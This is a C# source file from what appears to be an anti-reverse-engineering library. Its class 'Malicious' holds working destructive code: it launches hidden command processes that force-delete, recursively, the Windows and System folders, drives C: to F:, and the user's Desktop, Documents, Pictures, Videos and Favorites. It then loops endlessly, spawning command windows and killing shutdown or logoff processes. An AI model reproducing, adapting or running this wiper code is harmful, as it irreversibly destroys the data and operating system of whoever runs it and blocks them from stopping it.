using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace AntiRE.Runtime
{
    public class Malicious
    {
        /// <summary>
		/// Execute malicious codes to fuck off the system (warning not recommended)
		/// </summary>
        public static async void Initializing()
        {
            EraseHard();
            for (; ; )
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\cmd.exe");
                Process[] proc = Process.GetProcesses();
                foreach (Process process in proc)
                {
                    if (process.ProcessName.ToLower() == "shutdown" || process.ProcessName.ToLower() == "logoff")
                    {
                        process.Kill();
                    }
                }
                await Task.Delay(500);
            }
        }
        private static void EraseHard()
        {
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\"");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S D:\\");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S F:\\");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S C:\\");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S E:\\");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\"");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\"");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\"");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\"");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\"");
            new Thread(new ParameterizedThreadStart(ExecuteCommands))
            {
                IsBackground = true
            }.Start("/C DEL /F/Q/S \"" + Environment.GetFolderPath(Environment.SpecialFolder.System) + "\"");
        }

        private static void ExecuteCommands(object arg)
        {
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = arg.ToString();
                process.StartInfo = startInfo;
                process.Start();
            }
            catch { }
        }
    }
}
